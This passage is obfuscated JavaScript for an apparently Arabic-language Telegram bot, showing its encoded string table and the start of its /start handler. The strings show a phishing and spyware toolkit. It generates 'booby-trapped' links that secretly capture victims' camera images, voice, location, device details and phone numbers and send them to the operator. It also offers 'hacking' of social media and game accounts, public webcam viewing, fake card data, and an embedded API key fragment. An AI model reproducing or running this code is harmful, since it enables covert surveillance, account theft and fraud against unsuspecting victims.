        'مولدوفا\x20🇲🇩',
        'المجر\x20🇭🇺',
        '👨🏻‍🏫',
        'Mozilla/5.',
        'to\x20generat',
        'vzRIs',
        '.insecam.o',
        '0.0.0.0\x20Sa',
        'اتك\x20[\x20/inf',
        'get_link_',
        'token',
        ')\x20AppleWeb',
        'اختراق\x20اله',
        'بليز\x20🇧🇿',
        'DoZin',
        'zLYoK',
        'getChatMem',
        'قر\x20على\x20الز',
        'لشاشة:\x20',
        'response',
        'ي\x20تلغيم\x20را',
        'OFofl',
        'backQuery',
        'PORT',
        'trong>اضغط',
        'https',
        '\x20🌐\x0a-\x20إصدار',
        'LErcn',
        '.jpg',
        'get_pubg',
        'من\x20هذا\x20الد',
        'generate_v',
        '\x20as\x20expect',
        'BhRkk',
        'member',
        'مله\x20ارسلها',
        'لرابط\x20إليك',
        'ible-pract',
        '*\x0a\x0a',
        'XRfUf',
        'ه\x20يمنيه\x20قص',
        'node-teleg',
        'أوروغواي\x20🇺🇾',
        'نامج\x20وحذف\x20',
        'علومات\x20الج',
        'mefbH',
        '🇦🇫',
        'RsBqN',
        '/mm',
        'JNhNA',
        '\x20\x20\x20\x20',
        'إثيوبيا\x20🇪🇹',
        '\x20📡\x0a-\x20إمكان',
        'PNC\x20Bank',
        'jNnLT',
        'ابه\x20تلجرام',
        'KzcBq',
        'ف\x20\x20رساله\x20ج',
        'اتباع\x20الأو',
        'رومانيا\x20🇷🇴',
        'SSuul',
        'includes',
        'lstatSync',
        'تونس\x20🇹🇳',
        'hing\x20love\x20',
        'hwcdv',
        'اب\x20لفك\x20الح',
        'كولومبيا\x20🇨🇴',
        'تسجيل\x20صوت\x20',
        'سنغافورة\x20🇸🇬',
        '\x20:*\x20`',
        'رابط\x20هذا:\x20',
        'body_text',
        'ير\x20هذا\x20الر',
        'VBzpu',
        'otSrZ',
        'attempts',
        'رواندا\x20🇷🇼',
        'Pzbkq',
        'memory',
        'kgRve',
        'n/json',
        'ank',
        'لرقام\x20الضح',
        'videos',
        'ولة\x20الحصول',
        '9188640FqiaAK',
        'nvite',
        '\x20🔞',
        '\x20اخره\x20لاحق',
        '.vercel.ap',
        'أذربيجان\x20🇦🇿',
        '\x20🌍\x0a-\x20الدعم',
        '2BT3BlbkFJ',
        'ل\x20مره\x20اخرى',
        'كوستاريكا\x20',
        'tONYH',
        'امرا\x20الأما',
        'spihF',
        'ه\x20عبر\x20رابط',
        'YGpql',
        'ion',
        'س\x20لديك\x20إيم',
        '\x20أثناء\x20إرس',
        'الجزائر\x20🇩🇿',
        '1kNNPU6RVm',
        'iver',
        'get_joke',
        'touchSuppo',
        '.me/',
        'yqvzh',
        'Kit/537.36',
        'كينيا\x20🇰🇪',
        'اقع\x20💣',
        'i.internal',
        '/g.html?ch',
        '&duration=',
        'files',
        'ETIQj',
        'RjfcU',
        'م\x20مستخدم',
        'mm.html',
        'الرسالة\x20📩:',
        'OQDiw',
        'HApwk',
        '░░░░░░░░░░',
        'ول\x20الي\x20الر',
        'cLszx',
        'randomByte',
        'تة.',
        'وة\x20امانها\x20',
        'الأردن\x20🇯🇴',
        'ى\x20صورة\x20الم',
        'الإمارات\x20🇦🇪',
        'MaHCf',
        'ال\x20رابط\x20صح',
        'تم\x20إنشاء\x20ا',
        'لا\x20يوجد\x20اس',
        ']\x2050%',
        'ميع\x20قنوات\x20',
        '4FUHfWB',
        '<strong>قم',
        'كرة\x20المؤقت',
        'البرتغال\x20🇵🇹',
        'XetmN',
        'ب\x20شات\x20⭐',
        'Received\x20p',
        '\x20IP:\x20',
        'file',
        'isDirector',
        'c.html',
        'fvNux',
        'videoData',
        'getLocatio',
        '*الايدي\x20:\x20',
        'pWIUS',
        'أرسل\x20لي\x20را',
        'YqUzx',
        'تفادة\x20من\x20ا',
        'PblNC',
        'me/ygf2gbo',
        'تلغيم\x20رابط',
        'sLSes',
        'vice_info',
        'me/ZII0_bo',
        'نيوزيلندا\x20',
        'TTRBP',
        'السويد\x20🇸🇪',
        'سحب\x20جميع\x20ر',
        'NNeRg',
        'iVOmJ',
        '\x0aلحذف\x20الاي',
        'ase\x20try\x20ag',
        '\x20لتقنية\x20ال',
        'تفسير\x20الأح',
        'الأرجنتين\x20',
        'status',
        'بك\x20سوف\x20تحص',
        '1mkIxIb',
        '0\x20(Windows',
        'يمل...</st',
        'جنوب\x20أفريق',
        'QKfWL',
        'تم\x20استلام\x20',
        'فشل\x20في\x20إرس',
        'إستونيا\x20🇪🇪',
        'سيتم\x20تصوير',
        '/s.html?ch',
        'لبوت.',
        'jyFZG',
        'king\x20subsc',
        'صربيا\x20🇷🇸',
        '\x20للمتصفح:\x20',
        'PRYrI',
        'بيلاروس\x20🇧🇾',
        'r.html',
        'بنجاح\x20✅',
        'UlBvL',
        '<strong>حد',
        'مؤقتة.',
        'JkyHq',
        'fqinl',
        'iGoCu',
        'MmEva',
        'mSzdE',
        'البرازيل\x20🇧🇷',
        'اختراق\x20وات',
        'PuNAi',
        'ط\x20🔒',
        'zbeot',
        '\x20\x0aكلمة\x20الس',
        'إلغاء\x20اشتر',
        'لا\x20توجد\x20نب',
        'filter',
        'ذاكرة\x20المؤ',
        'vGngA',
        'BygxC',
        'أسماء\x20المس',
        'YJIcKlujfP',
        'dBhOb',
        'البحرين\x20🇧🇭',
        'قطر\x20🇶🇦',
        'tVOiE',
        '/submitVid',
        'file_id',
        '/record/',
        'express',
        'utf8',
        '\x0a📱\x20**معلوم',
        'اختراق\x20كام',
        'المشاهده\x20ع',
        '/captureBa',
        'btixY',
        'pokRl',
        '/email/',
        'سويسرا\x20🇨🇭',
        'قاط\x20الصور.',
        'ZZWxh',
        'me/lTV_l/3',
        'ليتوانيا\x20🇱🇹',
        'Your-User-',
        'كاليدونيا\x20',
        '\x27m*\x20[™](t.',
        'GtULA',
        'crdwk',
        'بط\x20جديد\x20',
        'بك!\x20لديك\x20ا',
        'وة\x20الامان\x20',
        'uTlSG',
        '\x20:\x20',
        'غواتيمالا\x20',
        'غيل:\x20',
        'ائل</stron',
        'neNumber',
        'اله\x20طويله\x20',
        's.html',
        'get_freefi',
        'create_ema',
        'يه\x20عبر\x20راب',
        'USA🇺🇸',
        'تم\x20تلغيم\x20ه',
        'لجهاز:\x20',
        'ghHsl',
        '▓▓▓▓▓▓░░░░',
        'غوادلوب\x20🇬🇵',
        '`\x0a*[-]\x20Cou',
        'slice',
        'EunLS',
        'kougG',
        '\x20🇹🇲',
        'تم\x20التحقق\x20',
        '\x20📜\x0a-\x20نوع\x20ا',
        'WCwhA',
        'collect_de',
        'ZJZcU',
        '\x20المستخدم:',
        't.html',
        'ابدأ\x20الاخت',
        '\x20📏\x0a-\x20إصدار',
        'bbBvi',
        'Bank\x20of\x20Am',
        'Capital\x20On',
        'YEFcI',
        '\x20complete',
        'ca.html',
        '\x20https://t',
        'افته\x20كـ\x20VI',
        'يح\x20يبدأ\x20بـ',
        '🔗\x20توليد\x20را',
        'الكاميرون\x20',
        'yeYMC',
        'NweMT',
        '🇳🇮',
        'IxgtR',
        'ckmJz',
        'تم\x20حذف\x20الم',
        '\x20🇰🇬',
        '50mb',
        'hGDtV',
        '🇨🇲',
        'log',
        '\x20sent\x20vide',
        '5068720feDEjJ',
        'ل\x20بنجاح:\x0a<',
        'LojfF',
        'iMpTo',
        'ظر\x20عن\x20رقمي',
        'SbRDz',
        'لألوان:\x20',
        'إختراق\x20فري',
        'صال:\x20',
        '\x20رابط\x20لالت',
        'لاتفيا\x20🇱🇻',
        'إضافة\x20أسما',
        'OrCZm',
        'اكرة\x20المؤق',
        'Fifth\x20Thir',
        'بوليفيا\x20🇧🇴',
        'سلوفاكيا\x20🇸🇰',
        'تخدمين:\x20',
        'voice',
        'e\x20Visa!*',
        'المجلد\x20غير',
        'osVersion',
        '/imageRece',
        'Chase\x20Bank',
        '@hsosgh',
        'time',
        'CNinx',
        'إضافة\x20مستخ',
        'GUUGf',
        '.temp-mail',
        'رقم\x20الهاتف',
        'strong>',
        'browserNam',
        '\x20🔵\x0a-\x20دعم\x20ا',
        '/record/:l',
        'الإكوادور\x20',
        '\x20🌐\x0a-\x20اسم\x20ا',
        '.io/api/v3',
        'اشترك\x20في\x20',
        'تصوير\x20بدقه',
        'LnyEy',
        'لوحة\x20التحك',
        'LrzYj',
        'hotos:\x20',
        '\x20هذا\x20الراب',
        'CkJaI',
        '\x20فاير\x20👾',
        'س\x20لديك\x20ايم',
        '7oxkoPuxqz',
        'otocol',
        'Citibank',
        'الذي\x20تم\x20ان',
        'ي\x20🕹',
        '<strong>لي',
        'رابط\x20تجميع',
        'uploads',
        'نيجيريا\x20🇳🇬',
        'VfRRZ',
        'OXmzL',
        'Sent\x20photo',
        'بتجميعها:\x20',
        'جداً\x20لا\x20تق',
        'جمع\x20معلوما',
        'ية\x20فيديو\x20🎥',
        'zBsgf',
        'eKSBR',
        'firstName',
        'HCUjE',
        '/whatsapp?',
        'rning-anim',
        'getUserPro',
        'لموقع\x20الجغ',
        'ل\x20وهمي\x20💌',
        'cKGUl',
        'بنما\x20🇵🇦',
        'CZCET',
        'TrRMi',
        '🇳🇨',
        'https://fa',
        'recordVoic',
        'لبنان\x20🇱🇧',
        'emails.jso',
        'المكسيك\x20🇲🇽',
        'AzIaN',
        'memoryStor',
        'hing\x20joke:',
        'rg/en/byco',
        'filePhotos',
        '🇱🇺',
        'ccurred:',
        'ing\x20Telegr',
        '**\x0a-\x20الدول',
        'اكتب\x20لي\x20رس',
        'https://t.',
        'ية\x20تحديد\x20ا',
        'qFyup',
        'forEach',
        'إيقاف\x20البر',
        ']\x200%',
        'ram-bot-ap',
        'lUvhs',
        'ck/',
        '<strong>•\x20',
        '\x20المحظور\x20م',
        'امريكا\x20🇺🇸',
        'ctwgn',
        'secondName',
        'لف\x20الشخصي:',
        'ont/:linkI',
        '\x20قم\x20في\x20تعي',
        'الهند\x20🇮🇳',
        '-\x20نوع\x20الات',
        'startsWith',
        'تشيلي\x20🇨🇱',
        'for\x20chatId',
        'Fcdsv',
        'atId=',
        'ل\x20عن\x20800حر',
        'البوسنة\x20وا',
        'تايلاند\x20🇹🇭',
        'IAZEL',
        'xx.html',
        'buffer',
        'ZkimH',
        'xNkAa',
        'SwjPw',
        'lFgKi',
        'YNomw',
        'لاوس\x20🇱🇦',
        '\x20روبوتًا.',
        'gpt-3.5-tu',
        'ضحيه\x20في\x20اد',
        'IMqWa',
        'ث\x20خطأ\x20أثنا',
        'kSAgt',
        'ck/:linkId',
        'لمراقبة\x20📡',
        'networkSpe',
        'فرنسا\x20🇫🇷',
        'message',
        '🇵🇷',
        'sqryG',
        'تم\x20لغيم\x20ال',
        '\x20نقاط',
        'jWKzN',
        'ظه\x20بزم\x20يكو',
        'د\x20الأنوية:',
        'XdBvi',
        'بنغلاديش\x20🇧🇩',
        'type',
        '\x0a<strong>ي',
        'boid-outst',
        'once',
        'me/',
        'وقع\x20📍',
        'يد\x20وهمي\x20لا',
        'trong>',
        '\x20لاحقًا.',
        'geolocatio',
        'XOqck',
        'iTZUH',
        'ابط\x20لإضافة',
        'onText',
        'NQnEZ',
        '\x20🔒\x0a-\x20نطاق\x20',
        'التحكم:',
        'error',
        'JtVRO',
        'اولة\x20مرة\x20أ',
        'bluetoothS',
        'BlLcu',
        'QHsiQ',
        'sendVideo',
        'القائمة:\x20',
        'nHvDq',
        'tWHJc',
        'max',
        's://t.me/',
        '\x20الاتصال.',
        'رابط\x20جمع\x20ا',
        'er.glitch.',
        'ات\x20الجهاز:',
        'TPEXM',
        'q.whatsapp',
        'POsCc',
        'مرحبًا!\x20اض',
        'IqqGr',
        'use',
        '/ca',
        'لا\x20بك\x20:\x20|\x20',
        'brDGN',
        'شخص\x20جديد\x20د',
        'gram',
        '\x20🗑</strong',
        'rm?chatId=',
        'isa',
        'حدث\x20خطأ',
        'ل\x20على\x20المن',
        'تم\x20إرسال\x20م',
        'اتف\x20كاملاً',
        'j1u7p1lXXG',
        'CZykq',
        'data',
        'qRRLN',
        'ر\x20رابط\x20🔒',
        'JhDCQ',
        'ناميبيا\x20🇳🇦',
        '<strong>لم',
        'linkId',
        'جاري\x20اخترا',
        'essing\x20vid',
        'choices',
        'almunharif',
        'لة\x20حالياً',
        'سايل\x20الضحي',
        'axios',
        'ener',
        'userId',
        'لوكسمبورغ\x20',
        'https://mo',
        'NBPeE',
        '`\x0a*[-]\x20Ban',
        'تصوير\x20الضح',
        'ألمانيا\x20🇩🇪',
        'viXKA',
        'النرويج\x20🇳🇴',
        'أوزبكستان\x20',
        'get_camera',
        'إختراق\x20ببج',
        'HmIea',
        'غيرنزي\x20🇬🇬',
        'HEndP',
        'inline_key',
        'rDrZL',
        'شاءه\x20\x20/an\x0a',
        '\x20أثناء\x20محا',
        'Vnedk',
        'ta\x20found\x20o',
        'generate_i',
        'KGeeI',
        'EWHjy',
        'yPila',
        'اختراق\x20تيك',
        'iry\x20:*\x20`',
        'floor',
        'خل\x20إلى\x20الر',
        '/?page=',
        'yuMGL',
        'تم\x20إضافة\x20ا',
        'لهاتف:\x20',
        '%\x20🔋\x0a-\x20هل\x20ا',
        'لخدمة.</st',
        'HqmbP',
        'ng>يرجى\x20ات',
        '\x20🔒',
        'ريونيون\x20🇷🇪',
        'listen',
        'mkdirSync',
        'YGbze',
        '1666917LLlOUd',
        '<strong>❗ل',
        'Error\x20fetc',
        'لقد\x20تم\x20وصو',
        'الرجاء\x20توف',
        'في\x20الطلب.',
        ']\x2025%',
        '📞\x20إرسال\x20جه',
        'تم\x20اختراق\x20',
        'capture_vi',
        'sendMessag',
        'https://ap',
        'userLink',
        'xSwRN',
        'ت\x20الجهاز',
        'r\x20data\x20for',
        'qCMtZ',
        'المغرب\x20🇲🇦',
        'sendLocati',
        'حدث\x20خطأ\x20أث',
        'fPrUA',
        'باراغواي\x20🇵🇾',
        'من\x20أنك\x20لست',
        'all',
        'نة:\x20',
        'EDDdl',
        'الرجاء\x20الا',
        '*الاسم\x20:\x20',
        'أستراليا\x20🇦🇺',
        'feVNg',
        'لعبة\x20الأذك',
        'ZDyWk',
        'SysHE',
        'ناء\x20حذف\x20ال',
        'السعودية\x20🇸🇦',
        'موناكو\x20🇲🇨',
        'OCxSN',
        'pkcGh',
        'Bearer\x20sk-',
        'FGcVm',
        'حقق\x20من\x20جهة',
        'EySSz',
        'صي.',
        '.txt',
        'ZjROO',
        '/ios',
        'بيرو\x20🇵🇪',
        'IuviI',
        '📸الصورة\x20',
        'أفغانستان\x20',
        'ing\x20video:',
        'تايوان\x20🇹🇼',
        'mMPAF',
        'prev_',
        'push',
        '\x20🧠\x0a-\x20الذاك',
        '1241306AHXFtb',
        'جزر\x20كايمان',
        'imageDatas',
        '`\x0a*[-]\x20CVV',
        'email',
        'GwOSz',
        'next_',
        'اختر\x20الدول',
        'راقبه',
        'networkTyp',
        'orage',
        'فذ\x20',
        'تركيا\x20🇹🇷',
        '\x20عاليه\x20🖼',
        'وله\x20يمكنك\x20',
        '18WQWziy',
        'رة\x20الداخلي',
        'ike\x20Gecko)',
        'rong>\x0a\x20\x20\x20\x20',
        'gXTGW',
        'SQzJZ',
        'vipUsers',
        'اب\x20سريعاً\x0a',
        'ook',
        '\x20Chrome/11',
        'internalSt',
        'Failed\x20to\x20',
        'xITSJ',
        '▓▓▓▓▓▓▓▓▓▓',
        'الخادم\x20يعم',
        'ال\x20معلومات',
        'crypto',
        'Wells\x20Farg',
        'أيرلندا\x20🇮🇪',
        'rong>',
        'ZZWWU',
        'مستخدم\x20لإض',
        'اختراق\x20الم',
        'deviceName',
        'eXlsl',
        'd\x20Type\x20:*\x20',
        '</strong>',
        'screenOrie',
        'country',
        'UptUG',
        'upport',
        'uorescent-',
        'لرجاء\x20المح',
        '/email/new',
        '/getLocati',
        '*👤\x20معلومات',
        'ber',
        'حدثت\x20مشكلة',
        'send',
        'اختراق\x20فري',
        '\x20الرسالة.\x20',
        'cIspE',
        'HhGvf',
        'Invalid\x20re',
        'captureFro',
        'getItem',
        'الدنمارك\x20🇩🇰',
        '\x20كـ\x20VIP.',
        'CLASSIC',
        'email\x0a\x0aلظه',
        'لهجه\x20اليمن',
        'ر:\x20',
        'urlencoded',
        'No\x20visa\x20da',
        'باع\x20هذه\x20ال',
        'LGJjr',
        'د\x20لنسخه</s',
        'ي\x20في\x20لوحة\x20',
        'ألبانيا\x20🇦🇱',
        'ال\x20معرف\x20ال',
        '🇪🇨',
        'iTSoM',
        '/start',
        'يره\x20جداً\x20ب',
        'XTgKB',
        'latitude',
        'dpAOQ',
        'AgBkO',
        'قر\x20على\x20الر',
        '*Hi\x20Bro,\x20I',
        'تجرام\x20🖥',
        'بلجيكا\x20🇧🇪',
        'ياء\x20🧠',
        'PHHpQ',
        'eMfoo',
        'Number\x20:*\x20',
        'city',
        'ن\x20🇩🇴',
        '\x20GB\x20💾\x0a-\x20عد',
        'سو\x20🇧ﺫ',
        '`\x0a*[-]\x20Val',
        'حاولة\x20مرة\x20',
        'match',
        'h.me/',
        'Generating',
        'ق\x20الهاتف\x20ك',
        'عدد\x20النقاط',
        'PDGEY',
        '\x20يتم\x20إنشاء',
        'لرابط\x20لختر',
        'م\x20هذا\x20هو\x0a:',
        'تنزانيا\x20🇹🇿',
        'xIYGY',
        'بط\x20دعوة',
        'd\x20or\x20video',
        'HfvCz',
        'user_id',
        'stringify',
        'lo.html',
        '\x20النكتة.\x20ا',
        'every',
        'NcFlW',
        'جورجيا\x20🇬🇪',
        'Received\x20d',
        'catch',
        'سريلانكا\x20🇱🇰',
        'join',
        '\x20سابقاً\x20هو',
        '@lTV_l',
        'PDCaF',
        'kxesc',
        'مل\x20وهمي\x20\x20/',
        'securityPr',
        'KUEnZ',
        'ري\x20انشاء\x20ا',
        'حساب\x20جديد⚠️',
        'لهرسك\x20🇧🇦',
        'MkfbF',
        'ع\x20اضافة\x20فا',
        'add_names',
        'applicatio',
        'os\x20for\x20cha',
        '/strong><c',
        'يه\x20لمعرفة\x20',
        '/capture',
        'اعطيني\x20نكت',
        'i.openai.c',
        'rshq_faceb',
        'ل\x20على1$\x20\x0a:',
        'n.html',
        'هذا\x20لفتح\x20أ',
        'اب\x20أولاً</',
        'مرحبًا\x20بك\x20',
        'dbpqs',
        'unlinkSync',
        'WHNqK',
        'يرجى\x20إرسال',
        'WxwvC',
        '\x20📡\x0a-\x20الوقت',
        'untry/',
        'ر\x20الدوله\x20ا',
        'م\x20في\x20طلب\x20ك',
        'مرحبا!\x20في\x20',
        'ية\x20📷',
        'exit',
        'QZVIK',
        'لضحيه\x20فيدي',
        'اول\x20مره\x20اخ',
        '\x20⚠️',
        '\x0aلعرض\x20الرس',
        'رافي:\x20',
        'iBBUT',
        'tor',
        'qTRLk',
        'ue\x20:*\x20`',
        'في\x20هذا\x20الد',
        'Id\x20',
        '\x20المحتله\x20🇮🇱',
        '\x20تجميع\x20الن',
        'بورتوريكو\x20',
        't?start=',
        '\x20التي\x20قمت\x20',
        'KGcll',
        '/submitVoi',
        'axvlY',
        'بك\x20فقط.',
        'ه\x20وكلمات\x20ج',
        'path',
        'GGNWT',
        'contact',
        'cyPOD',
        'writeFileS',
        'ق\x20كامراة\x20م',
        'umaUE',
        'ن\x20النت\x20قوي',
        'بـ\x20\x22https\x22',
        'dVNxi',
        'QSfYV',
        'https://vv',
        'المزيد',
        'هندوراس\x20🇭🇳',
        'message:',
        'ماكاو\x20🇲🇴',
        'ومات\x20جهازك',
        'book',
        'كرواتيا\x20🇭🇷',
        'ed.',
        'لام\x20🧙‍♂️',
        '*[-]\x20Card\x20',
        'املاً\x20قم\x20ب',
        'UAbJi',
        'KzXkJ',
        '\x20⚡\x0a-\x20الشبك',
        'connection',
        'nZjMA',
        'جرب\x20دوله\x20م',
        'AjEmq',
        '\x20الرجاء\x20تغ',
        '▓▓▓▓░░░░░░',
        'بوك\x20🔮',
        'administra',
        'SIGINT',
        'https://fl',
        '.png',
        'SaTsE',
        'ابط\x20الخاص\x20',
        '\x20الثانية)\x0a',
        'OlKxx',
        'PszIj',
        '/completio',
        'خطأ.',
        'AZXuJ',
        'creator',
        '\x20جهة\x20الاتص',
        'ترينيداد\x20و',
        'callback_q',
        'أنغولا\x20🇦🇴',
        ':</strong>',
        'صل\x20لي30$\x20س',
        'ها\x20رقمي\x20ول',
        '/captureFr',
        'قائي\x20',
        'o\x20]</stron',
        'code',
        '🇳🇿',
        'jAHyj',
        'ylPiS',
        '@hqooosjjd',
        'FIeyE',
        '/submitNam',
        'كوريا\x20الجن',
        'yUYNL',
        'redirect',
        'كامرات\x20في\x20',
        '/k.html?ch',
        'config',
        'https://fo',
        'المدفوع\x20تل',
        'ook:',
        'الصورة:',
        'rest-plaus',
        'split',
        'لم\x20يتم\x20است',
        '-two-olive',
        'W5B7mU',
        'captureBac',
        'BBATQ',
        '\x20NT\x2010.0;\x20',
        'fari/537.3',
        'cpuCores',
        'FvPKR',
        'gram:',
        'oAMcC',
        '2DOs-Fgdwp',
        'LyZXn',
        'منتهى\x20قم\x20ف',
        'سحب\x20جميع\x20ص',
        'معرفة\x20رقم\x20',
        'كول\x20الأمان',
        'body-parse',
        '\x20🎨\x0a-\x20تاريخ',
        'ر\x20لجمع\x20معل',
        'am\x20message',
        'جزر\x20فارو\x20🇫🇴',
        'الرجاء\x20إدخ',
        'DAgcu',
        'السودان\x20🇸🇩',
        'TEABR',
        'send\x20video',
        'السلفادور\x20',
        'hKdQv',
        'hGWlm',
        'dOuBE',
        'VvSDu',
        'post',
        'عمان\x20🇴🇲',
        'خص\x20في\x20الدخ',
        '100mb',
        'mSfQS',
        'المطور\x20قبل',
        'ync',
        'mNeTK',
        '\x20الجهاز:\x20',
        'DqbjC',
        '🇨🇷',
        'امرا\x20الخلف',
        '5Iw5wkVItL',
        'ال\x20الأسماء',
        'ngan.glitc',
        'ription\x20st',
        'total_coun',
        'json',
        'ود\x20هاذا\x20ال',
        'وبية\x20🇰🇷',
        '\x20فاير',
        'باكستان\x20🇵🇰',
        'screenReso',
        'sendPhoto',
        'add_vip',
        'رى\x20لاحقًا.',
        'process\x20vi',
        'array',
        'random',
        'JSiCG',
        '\x20🇰🇾',
        'ode>',
        'بلغاريا\x20🇧🇬',
        'then',
        '🇬🇹',
        'ت\x20الجهاز\x20🔬',
        'SIGHUP',
        'pPxpA',
        'تم\x20إرسال\x20ا',
        '&type=face',
        'WWDje',
        'مرحبًا!\x20بك',
        'anding-mas',
        'مرحبًا!\x20ان',
        'fetch\x20visa',
        'om/v1/chat',
        'ACQfK',
        'MyuZC',
        'ntry\x20:*\x20`',
        'معلومات\x20حس',
        '/:userId',
        'منغوليا\x20🇲🇳',
        'PcDdI',
        'ation',
        'SfFZZ',
        'Vsdox',
        'ليبيا\x20🇱🇾',
        'مية\x20📸',
        '🇮🇩',
        'JaToV',
        'fhlLA',
        'EaUMd',
        'غانا\x20🇬🇭',
        'ميانمار\x20🇲🇲',
        'م\x20استلمها\x20',
        'Ziypc',
        'rcbXn',
        '918535UGEWJh',
        '<strong>ال',
        'gttEC',
        'النمسا\x20🇦🇹',
        'aLWyI',
        'oRntD',
        'لمعلومات:\x20',
        'تم\x20انشاء\x20ا',
        'خرى\x20لاحقًا',
        'from',
        'أوغندا\x20🇺🇬',
        'ال\x20الخاصة\x20',
        'readdirSyn',
        'pVhPy',
        'xDArK',
        'qzYNL',
        'get_photo_',
        'fvkgc',
        'التواصل\x20مع',
        'env',
        'ارساله\x20لضح',
        'DdFVt',
        'الضحيه\x20📲',
        'ain\x20later.',
        'values',
        'photos',
        '/so',
        'QuKUx',
        '\x20إلى\x20التلغ',
        '\x20🔄\x0a-\x20عمق\x20ا',
        '/messages',
        'ZPMKm',
        '/Messages\x0a',
        'ouZLq',
        'بريطانيا\x20🇬🇧',
        'remove_vip',
        'السنغال\x20🇸🇳',
        'mat\x20is\x20not',
        'تم\x20تصوير\x20ا',
        'بوت\x20اختراق',
        '/submitLoc',
        'fwWDF',
        'o\x20for\x20chat',
        'wqcqc',
        'قم\x20بإرسال\x20',
        'ل\x20بعد\x20🗳ً</',
        'ice.glitch',
        'ير\x20chatId\x20',
        'lastUpdate',
        'i.html',
        '/ge',
        'tiktok',
        '/xx',
        'rqhiq',
        '\x20✋\x0a\x20\x20\x20\x20\x20\x20\x20',
        'fICEM',
        'قبة\x20📡',
        '\x20المراقبه\x20',
        'أرمينيا\x20🇦🇲',
        'znPhR',
        'احصل\x20على\x20ر',
        'uuid',
        'An\x20error\x20o',
        'إضافة\x20مشتر',
        'ZqJMm',
        'يس\x20اسمي',
        '\x20على\x20معلوم',
        'U.S.\x20Bank',
        'RoudK',
        'لمستخدم\x20',
        'الدومينيكا',
        'browserVer',
        'board',
        'bqeab',
        'dcGWe',
        '\x0a<code>',
        'تم\x20استخدام',
        'static',
        'instagram',
        'اختراق\x20فيس',
        '\x20كل\x20الازرا',
        '2413641RXsEPZ',
        't)\x0a\x20\x20\x20\x20\x20\x20',
        'نيبال\x20🇳🇵',
        'اق\x20وتساب\x0a:',
        'longitude',
        'تم\x20انشاء\x20ر',
        'راق\x20كامراة',
        'إنشاء\x20إيمي',
        '\x20المميزات\x20',
        'ة\x20الاتصال',
        'fyaGu',
        'multer',
        'قبرص\x20🇨🇾'
    ];
    _0x1ced = function () {
        return _0x77c706;
    };
    return _0x1ced();
}
bot[_0x4e73bb(0x2d9)](/\/start/, async _0x377ad9 => {
    const _0x10b4f7 = _0x4e73bb, _0x3b983d = {
            'yUYNL': function (_0xb98426, _0x30cba1) {
                return _0xb98426(_0x30cba1);
            },
            'kkFFT': _0x10b4f7(0x354) + _0x10b4f7(0xc7) + _0x10b4f7(0x194) + _0x10b4f7(0x498) + _0x10b4f7(0x5cf) + _0x10b4f7(0x1c5),
            'OFofl': _0x10b4f7(0x4bc) + _0x10b4f7(0x526) + _0x10b4f7(0x6b3),
            'spihF': _0x10b4f7(0x574) + _0x10b4f7(0x16a) + _0x10b4f7(0x4cc),
            'BsldV': _0x10b4f7(0x574) + _0x10b4f7(0x49e) + _0x10b4f7(0x410),
            'EySSz': _0x10b4f7(0x397) + _0x10b4f7(0x2d1),
            'UptUG': _0x10b4f7(0x14d) + _0x10b4f7(0x554),
            'HhGvf': _0x10b4f7(0x1ee) + _0x10b4f7(0x5de) + _0x10b4f7(0x50e),
            'mQpZi': _0x10b4f7(0x31a) + 's',
            'znPhR': _0x10b4f7(0x315) + _0x10b4f7(0x276),
            'CNinx': _0x10b4f7(0x343) + _0x10b4f7(0x5a1),
            'TfZck': _0x10b4f7(0x1d7) + _0x10b4f7(0x635),
            'hGWlm': _0x10b4f7(0xe6) + _0x10b4f7(0xe9),
            'CdDVz': _0x10b4f7(0x61c) + _0x10b4f7(0x3c7),
            'bbfJv': _0x10b4f7(0x525) + _0x10b4f7(0x448),
            'OQDiw': _0x10b4f7(0xcb) + _0x10b4f7(0x26b),
            'MpUYV': _0x10b4f7(0x126),
            'iBBUT': _0x10b4f7(0x3a8) + _0x10b4f7(0x265),
            'ydKJu': _0x10b4f7(0x209) + 're',
            'KKdNg': _0x10b4f7(0x61f) + _0x10b4f7(0x19a),
            'fyaGu': _0x10b4f7(0x3f8),
            'Ibnth': _0x10b4f7(0x329) + _0x10b4f7(0x65a),
            'uTlSG': _0x10b4f7(0x64c) + _0x10b4f7(0x54b) + _0x10b4f7(0x604),
            'BhRkk': _0x10b4f7(0x44b) + _0x10b4f7(0x3a0) + _0x10b4f7(0xb0) + _0x10b4f7(0x4a1) + _0x10b4f7(0x3d4),
            'fwWDF': _0x10b4f7(0x275) + _0x10b4f7(0x4b6),
            'RsBqN': _0x10b4f7(0x21a) + _0x10b4f7(0x1ac),
            'tONYH': _0x10b4f7(0x1b7) + _0x10b4f7(0x43c),
            'CkJaI': _0x10b4f7(0x312) + _0x10b4f7(0x27c) + _0x10b4f7(0x62e) + _0x10b4f7(0x2eb) + _0x10b4f7(0x2d0),
            'qCMtZ': _0x10b4f7(0x1aa) + _0x10b4f7(0x415),
            'pokRl': _0x10b4f7(0x623),
            'tineQ': _0x10b4f7(0x115) + _0x10b4f7(0x2fe) + _0x10b4f7(0x161),
            'HfvCz': _0x10b4f7(0x6b4),
            'BFzyu': _0x10b4f7(0x358) + _0x10b4f7(0x3c9),
            'qTRLk': _0x10b4f7(0x46d) + _0x10b4f7(0x471) + _0x10b4f7(0x12e) + _0x10b4f7(0x504) + _0x10b4f7(0x176),
            'PuNAi': _0x10b4f7(0x5c6) + _0x10b4f7(0x10b),
            'Fcdsv': _0x10b4f7(0x294) + _0x10b4f7(0x1f7) + '3',
            'AjEmq': _0x10b4f7(0x5ed) + _0x10b4f7(0x17a),
            'IxRWX': _0x10b4f7(0x6c6) + _0x10b4f7(0x2ce) + _0x10b4f7(0x4bd) + _0x10b4f7(0x55b) + 'e/',
            'uPoeE': _0x10b4f7(0x52e) + _0x10b4f7(0x27f),
            'SbRDz': _0x10b4f7(0x20a) + 'il',
            'OrCZm': _0x10b4f7(0xec) + '💳',
            'AgBkO': _0x10b4f7(0x128) + _0x10b4f7(0x2fa),
            'mSzdE': _0x10b4f7(0x25e) + _0x10b4f7(0x37f),
            'YEFcI': _0x10b4f7(0x4e6) + _0x10b4f7(0x9d),
            'AzIaN': _0x10b4f7(0x482) + _0x10b4f7(0x4ec),
            'zBsgf': _0x10b4f7(0x325) + _0x10b4f7(0x160),
            'wkOZW': _0x10b4f7(0x4e8) + _0x10b4f7(0x656),
            'Vsdox': _0x10b4f7(0x294) + _0x10b4f7(0x9f),
            'zbeot': function (_0x45a6f8, _0x48404b) {
                return _0x45a6f8 === _0x48404b;
            },
